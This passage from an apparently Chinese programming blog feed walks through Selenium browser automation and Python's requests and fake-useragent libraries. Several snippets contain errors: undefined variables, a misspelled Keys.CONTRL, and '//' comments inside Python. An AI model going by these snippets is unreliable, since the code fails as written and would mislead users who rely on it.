网页源码</span></span><br></pre></td></tr></table></figure><p>html例子</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;title-content&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com/s?cl=3<span class="symbol">&amp;amp;</span>tn=baidutop10<span class="symbol">&amp;amp;</span>fr=top1000<span class="symbol">&amp;amp;</span>wd=%E5%90%84%E5%9C%B0%E8%B4%AF%E5%BD%BB%E5%8D%81%E4%B9%9D%E5%B1%8A%E5%85%AD%E4%B8%AD%E5%85%A8%E4%BC%9A%E7%B2%BE%E7%A5%9E%E7%BA%AA%E5%AE%9E<span class="symbol">&amp;amp;</span>rsv_idx=2<span class="symbol">&amp;amp;</span>rsv_dl=fyb_n_homepage<span class="symbol">&amp;amp;</span>sa=fyb_n_homepage<span class="symbol">&amp;amp;</span>hisfilter=1&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;title-content-index c-index-single c-index-single-hot1&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;title-content-title&quot;</span>&gt;</span>各地贯彻十九届六中全会精神纪实<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;index-logo-src&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//www.baidu.com/img/flexible/logo/pc/result.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;到百度首页&quot;</span> <span class="attr">title</span>=<span class="string">&quot;到百度首页&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">news = driver.find_element(By.CLASS_NAME, <span class="string">&#x27;title-content&#x27;</span>) </span><br><span class="line">logo = driver.find_element(By.CLASS_NAME, <span class="string">&#x27;index-logo-src&#x27;</span>) </span><br><span class="line"><span class="built_in">print</span>(news.text)<span class="comment">#获取text值</span></span><br><span class="line"><span class="built_in">print</span>(news.get_attribute(<span class="string">&#x27;href&#x27;</span>))  <span class="comment">#获取栗子中的url</span></span><br><span class="line"><span class="built_in">print</span>(logo.<span class="built_in">id</span>)<span class="comment">#6af39c9b-70e8-4033-8a74-7201ae09d540</span></span><br><span class="line"><span class="built_in">print</span>(logo.location)<span class="comment">#&#123;&#x27;x&#x27;: 490, &#x27;y&#x27;: 46&#125;</span></span><br><span class="line"><span class="built_in">print</span>(logo.tag_name)<span class="comment">#img</span></span><br><span class="line"><span class="built_in">print</span>(logo.size)<span class="comment">#&#123;&#x27;height&#x27;: 129, &#x27;width&#x27;: 270&#125;</span></span><br></pre></td></tr></table></figure><p><strong>单选</strong></p><p>先定位需要单选的某个元素，然后点击一下即可</p><p><strong>多选</strong></p><p>依次定位需要选择的元素，点击即可</p><p><strong>下拉框</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.support.select <span class="keyword">import</span> Select<span class="comment">#导入类</span></span><br></pre></td></tr></table></figure><p><strong>拖拽</strong></p><p>拖拽操作就是指定开始位置和结束位置,类似于滑块验证码.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line"></span><br><span class="line">element = webdriver.Chrome()</span><br><span class="line">url = <span class="string">&#x27;https://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&#x27;</span></span><br><span class="line">element.get(url)  </span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">element.switch_to.frame(<span class="string">&#x27;iframeResult&#x27;</span>)  <span class="comment">#选择iframe</span></span><br><span class="line"><span class="comment"># 指定开始位置</span></span><br><span class="line">source = element.find_element(By.ID,<span class="string">&quot;draggable&quot;</span>)</span><br><span class="line"><span class="comment"># 指定结束位置</span></span><br><span class="line">target = element.find_element(By.ID,<span class="string">&quot;droppable&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行元素的拖放操作</span></span><br><span class="line">actions = ActionChains(browser)<span class="comment">#执行操作的对象</span></span><br><span class="line">actions.drag_and_drop(source, target)<span class="comment">#执行拖放</span></span><br><span class="line">actions.perform()</span><br><span class="line"><span class="comment"># 拖拽</span></span><br><span class="line">time.sleep(<span class="number">15</span>)</span><br><span class="line"><span class="comment"># 关闭浏览器</span></span><br><span class="line">element.close()</span><br></pre></td></tr></table></figure><p><strong>悬停</strong></p><p>选择一个位置 , 执行move_to_element()移动到目标位置即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">element = webdriver.Chrome()</span><br><span class="line">url = <span class="string">&#x27;https://www.baidu.com&#x27;</span></span><br><span class="line">element.get(url)  </span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定位悬停的位置</span></span><br><span class="line">move = browser.find_element_by_css_selector(<span class="string">&quot;#form &gt; span.bg.s_ipt_wr.new-pmd.quickdelete-wrap &gt; span.soutu-btn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 悬停操作</span></span><br><span class="line">actions = ActionChains(element)<span class="comment">#执行操作的对象</span></span><br><span class="line">actions.move_to_element(move)<span class="comment">#移动到目标位置</span></span><br><span class="line">actions.perform()</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭浏览器</span></span><br><span class="line">element.close()</span><br></pre></td></tr></table></figure><h3 id="键盘操作"><a href="#键盘操作" class="headerlink" title="键盘操作"></a>键盘操作</h3><p>先定位在操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">send_keys(Keys.BACK_SPACE)<span class="comment">#删除键(BackSpace)</span></span><br><span class="line">send_keys(Keys.SPACE)<span class="comment">#空格键(Space)</span></span><br><span class="line">send_keys(Keys.TAB)<span class="comment">#制表键(TAB)</span></span><br><span class="line">send_keys(Keys.ESCAPE)<span class="comment">#回退键(ESCAPE)</span></span><br><span class="line">send_keys(Keys.ENTER)<span class="comment">#回车键(ENTER)</span></span><br><span class="line">send_keys(Keys.CONTRL,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#全选(Ctrl+A)</span></span><br><span class="line">send_keys(Keys.CONTRL,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#复制(Ctrl+C)</span></span><br><span class="line">send_keys(Keys.CONTRL,<span class="string">&#x27;x&#x27;</span>)<span class="comment">#剪切(Ctrl+X)</span></span><br><span class="line">send_keys(Keys.CONTRL,<span class="string">&#x27;v&#x27;</span>)<span class="comment">#粘贴(Ctrl+V)</span></span><br><span class="line">send_keys(Keys.F1)<span class="comment">#键盘F1</span></span><br><span class="line">send_keys(Keys.F12)<span class="comment">#键盘F12</span></span><br></pre></td></tr></table></figure><h3 id="延时等待"><a href="#延时等待" class="headerlink" title="延时等待"></a>延时等待</h3><p>确保全部节点都加载出来,需要设置延时等待一定时间或者条件.</p><p><strong>强制等待</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time.sleep(<span class="number">5</span>) <span class="comment">#延时5秒</span></span><br></pre></td></tr></table></figure><p><strong>隐式等待</strong></p><p><code>implicitly_wait()</code>设置等待时间，如果到时间有元素节点没有加载出来，就会抛出异常</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">driver = webdriver.Chrome()</span><br><span class="line"></span><br><span class="line">driver.implicitly_wait(<span class="number">10</span>)  <span class="comment"># 隐式等待，等待时间10秒</span></span><br><span class="line">driver.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(driver.current_url)</span><br><span class="line"><span class="built_in">print</span>(driver.title)</span><br><span class="line">driver.close()<span class="comment"># 关闭浏览器</span></span><br></pre></td></tr></table></figure><p><strong>显式等待</strong></p><p>设置一个等待时间和一个条件，在规定时间内，每隔一段时间查看下条件是否成立，如果成立那么程序就继续执行，否则就抛出一个超时异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line"><span class="comment"># 设置等待时间10s</span></span><br><span class="line">wait = WebDriverWait(driver, <span class="number">10</span>)</span><br><span class="line"><span class="comment"># 设置判断条件：等待id=&#x27;kw&#x27;的元素加载完成</span></span><br><span class="line"><span class="built_in">input</span> = wait.until(EC.presence_of_element_located((By.ID, <span class="string">&#x27;kw&#x27;</span>)))</span><br><span class="line"><span class="comment"># 在关键词输入：关键词</span></span><br><span class="line"><span class="built_in">input</span>.send_keys(<span class="string">&#x27;Python&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭浏览器</span></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">driver.close()</span><br></pre></td></tr></table></figure><p><strong>其他等待条件</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断标题是否和预期的一致</span></span><br><span class="line">title_is</span><br><span class="line"><span class="comment"># 判断标题中是否包含预期的字符串</span></span><br><span class="line">title_contains</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断指定元素是否加载出来</span></span><br><span class="line">presence_of_element_located</span><br><span class="line"><span class="comment"># 判断所有元素是否加载完成</span></span><br><span class="line">presence_of_all_elements_located</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断某个元素是否可见. 可见代表元素非隐藏，并且元素的宽和高都不等于0，传入参数是元组类型的locator</span></span><br><span class="line">visibility_of_element_located</span><br><span class="line"><span class="comment"># 判断元素是否可见，传入参数是定位后的元素WebElement</span></span><br><span class="line">visibility_of</span><br><span class="line"><span class="comment"># 判断某个元素是否不可见，或是否不存在于DOM树</span></span><br><span class="line">invisibility_of_element_located</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断元素的 text 是否包含预期字符串</span></span><br><span class="line">text_to_be_present_in_element</span><br><span class="line"><span class="comment"># 判断元素的 value 是否包含预期字符串</span></span><br><span class="line">text_to_be_present_in_element_value</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断frame是否可切入，可传入locator元组或者直接传入定位方式：id、name、index或WebElement</span></span><br><span class="line">frame_to_be_available_and_switch_to_it</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断是否有alert出现</span></span><br><span class="line">alert_is_present</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断元素是否可点击</span></span><br><span class="line">element_to_be_clickable</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断元素是否被选中,一般用在下拉列表，传入WebElement对象</span></span><br><span class="line">element_to_be_selected</span><br><span class="line"><span class="comment"># 判断元素是否被选中</span></span><br><span class="line">element_located_to_be_selected</span><br><span class="line"><span class="comment"># 判断元素的选中状态是否和预期一致，传入参数：定位后的元素，相等返回True，否则返回False</span></span><br><span class="line">element_selection_state_to_be</span><br><span class="line"><span class="comment"># 判断元素的选中状态是否和预期一致，传入参数：元素的定位，相等返回True，否则返回False</span></span><br><span class="line">element_located_selection_state_to_be</span><br><span class="line"><span class="comment">#判断一个元素是否仍在DOM中，传入WebElement对象，可以判断页面是否刷新了</span></span><br><span class="line">staleness_of</span><br></pre></td></tr></table></figure><h3 id="多窗口标签切换"><a href="#多窗口标签切换" class="headerlink" title="多窗口标签切换"></a>多窗口标签切换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">driver = webdriver.Firefox()</span><br><span class="line">driver.get(<span class="string">&quot;https://movie.douban.com&quot;</span>)<span class="comment">#我们先打开一个网页</span></span><br><span class="line">newwindow = <span class="string">&#x27;window.open(&quot;https://www.baidu.com&quot;)&#x27;</span><span class="comment">#浏览器 新窗口打开连接</span></span><br><span class="line">driver.execute_script(newwindow)</span><br><span class="line">driver.switch_to_window(driver.window_handles[<span class="number">1</span>]) <span class="comment">#移动句柄，对新打开页面进行操作</span></span><br><span class="line">driver.find_element_by_xpath(<span class="string">&quot;&quot;</span>)<span class="comment">#具体操作</span></span><br><span class="line">driver.close()<span class="comment">#关闭该新打开的页面</span></span><br><span class="line">driver.switch_to_window(driver.window_handles[<span class="number">0</span>]) <span class="comment">#不关闭，要移动到上一个页面，我们要移动句柄</span></span><br></pre></td></tr></table></figure><h3 id="运行JavaScript"><a href="#运行JavaScript" class="headerlink" title="运行JavaScript"></a>运行JavaScript</h3><p>滑动,向下滑动等操作,运行javascript</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将页面滚动条滑到底部</span></span><br><span class="line">browser.execute_script(<span class="string">&#x27;window.scrollTo(0,document.body.scrollHeight)&#x27;</span>) </span><br><span class="line">browser.execute_script(<span class="string">&#x27;alert(&quot;To Bottom&quot;)&#x27;</span>)<span class="comment">//运行js代码</span></span><br><span class="line"><span class="comment">//向下滑动滚动条，跳转到目标元素处</span></span><br><span class="line">driver.execute_script(<span class="string">&quot;arguments[0].scrollIntoView();&quot;</span>, el)</span><br><span class="line"><span class="comment">//向上滑动滚动条，跳转到目标元素处</span></span><br><span class="line">driver.execute_script(<span class="string">&quot;arguments[0].scrollIntoView(false);&quot;</span>, el)</span><br></pre></td></tr></table></figure><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p><code>Cookie</code>的增删改查</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()<span class="comment"># 知乎发现页</span></span><br><span class="line">browser.get(<span class="string">&#x27;https://www.zhihu.com/explore&#x27;</span>) <span class="comment"># 获取cookie</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Cookies的值：<span class="subst">&#123;browser.get_cookies()&#125;</span>&#x27;</span>)<span class="comment"># 添加cookie</span></span><br><span class="line">browser.add_cookie(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;才哥&#x27;</span>, <span class="string">&#x27;value&#x27;</span>:<span class="string">&#x27;帅哥&#x27;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;添加后Cookies的值：<span class="subst">&#123;browser.get_cookies()&#125;</span>&#x27;</span>)<span class="comment"># 删除cookie</span></span><br><span class="line">browser.delete_all_cookies()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;删除后Cookies的值：<span class="subst">&#123;browser.get_cookies()&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Headless方式启动"><a href="#Headless方式启动" class="headerlink" title="Headless方式启动"></a>Headless方式启动</h3><p>官方文档中介绍，mac和linux环境要求chrome版本是59+，而windows版本的chrome要求是60+，同时chromedriver要求2.30+版本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"></span><br><span class="line">chrome_options = webdriver.ChromeOptions()</span><br><span class="line"><span class="comment"># 使用headless无界面浏览器模式</span></span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--headless&#x27;</span>) //增加无界面选项</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>) //如果不加这个选项，有时定位会出现问题</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动浏览器，获取网页源代码</span></span><br><span class="line">browser = webdriver.Chrome(chrome_options=chrome_options)</span><br><span class="line">mainUrl = <span class="string">&quot;https://www.taobao.com/&quot;</span></span><br><span class="line">browser.get(mainUrl)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;browser text = <span class="subst">&#123;browser.page_source&#125;</span>&quot;</span>)</span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 常见基础模块的使用</title>
      <link href="/posts/17098/"/>
      <url>/posts/17098/</url>
      
        <content type="html"><![CDATA[<h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><p>默认会对url进行编码.</p><p><strong>get请求</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;11&quot;</span>,<span class="string">&quot;uid&quot;</span>:<span class="string">&quot;888&quot;</span>&#125;</span><br><span class="line">r = requests.get(<span class="string">&#x27;https://api.github.com/events&#x27;</span>, params=payload)</span><br><span class="line">r = requests.get(<span class="string">&quot;http://httpbin.org/get&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response.status_code)  <span class="comment"># 打印状态码</span></span><br><span class="line"><span class="built_in">print</span>(response.url)          <span class="comment"># 打印请求url</span></span><br><span class="line"><span class="built_in">print</span>(response.headers)      <span class="comment"># 打印头信息</span></span><br><span class="line">r.headers[<span class="string">&#x27;Content-Type&#x27;</span>]    <span class="comment"># 访问响应头信息</span></span><br><span class="line"><span class="built_in">print</span>(response.cookies)      <span class="comment"># 打印cookie信息</span></span><br><span class="line"><span class="built_in">print</span>(response.text)         <span class="comment">#以文本形式打印网页源码</span></span><br><span class="line"><span class="built_in">print</span>(response.content)      <span class="comment">#以字节流形式打印</span></span><br><span class="line">bb = <span class="built_in">open</span>(<span class="string">&quot;content.txt&quot;</span>,<span class="string">&quot;ab+&quot;</span>)</span><br><span class="line">bb.write(response.content)</span><br></pre></td></tr></table></figure><p><strong>post请求</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;i&quot;</span>:<span class="string">&quot;%E5%A5%BD%E7%9A%84&quot;</span>,</span><br><span class="line">    <span class="string">&quot;from&quot;</span>:<span class="string">&quot;AUTO&quot;</span>,</span><br><span class="line">    <span class="string">&quot;to&quot;</span>:<span class="string">&quot;AUTO&quot;</span>,</span><br><span class="line">    <span class="string">&quot;smartresult&quot;</span>:<span class="string">&quot;dict&quot;</span>,</span><br><span class="line">    <span class="string">&quot;client&quot;</span>:<span class="string">&quot;fanyideskweb&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://fanyi.youdao.com/translate_o?smartresult=dict&amp;smartresult=rule&quot;</span></span><br><span class="line">r = requests.post(url,data=payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><strong>json请求</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;https://api.github.com/some/endpoint&#x27;</span></span><br><span class="line">payload = &#123;<span class="string">&#x27;some&#x27;</span>: <span class="string">&#x27;data&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, json=payload)</span><br></pre></td></tr></table></figure><p><strong>设置编码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r.encoding<span class="comment">#返回编码</span></span><br><span class="line">r.encoding = <span class="string">&#x27;ISO-8859-1&#x27;</span><span class="comment">#设置编码</span></span><br></pre></td></tr></table></figure><p><strong>原始请求</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(<span class="string">&#x27;https://api.github.com/events&#x27;</span>, stream=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><strong>自定义请求头</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;https://api.github.com/some/endpoint&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;my-app/0.0.1&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(url, headers=headers)</span><br></pre></td></tr></table></figure><p><strong>文件上传</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;report.xls&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, files=files)</span><br><span class="line">r.text</span><br></pre></td></tr></table></figure><p><strong>携带Cookie</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://httpbin.org/cookies&#x27;</span></span><br><span class="line">cookies = <span class="built_in">dict</span>(php_session=<span class="string">&#x27;working&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(url, cookies=cookies)</span><br><span class="line">r.text</span><br></pre></td></tr></table></figure><p><strong>重定向</strong></p><p>requests 默认跟踪重定向,使用<strong>allow_redirects=False</strong>可以禁用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(<span class="string">&#x27;http://github.com&#x27;</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">r.status_code</span><br><span class="line"></span><br><span class="line">r.history</span><br></pre></td></tr></table></figure><p><strong>代理</strong></p><p>http代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">  <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://10.10.1.10:3128&quot;</span>,</span><br><span class="line">  <span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://10.10.1.10:1080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.get(<span class="string">&quot;http://example.org&quot;</span>, proxies=proxies)</span><br></pre></td></tr></table></figure><p>socks5代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;socks5://user:pass@host:port&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;socks5://user:pass@host:port&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fake-useragent"><a href="#fake-useragent" class="headerlink" title="fake-useragent"></a>fake-useragent</h2><p>随机获取user_agent</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line">ua = UserAgent()</span><br><span class="line"><span class="comment">#随机获取一个ie浏览器ua</span></span><br><span class="line"><span class="built_in">print</span>(ua.ie <span class="keyword">or</span> ua.firefox <span class="keyword">or</span> ua.chrome)</span><br></pre></td></tr></table></figure><h2 id="Beautiful-soup"><a href="#Beautiful-soup" class="headerlink" title="Beautiful soup"></a>Beautiful soup</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 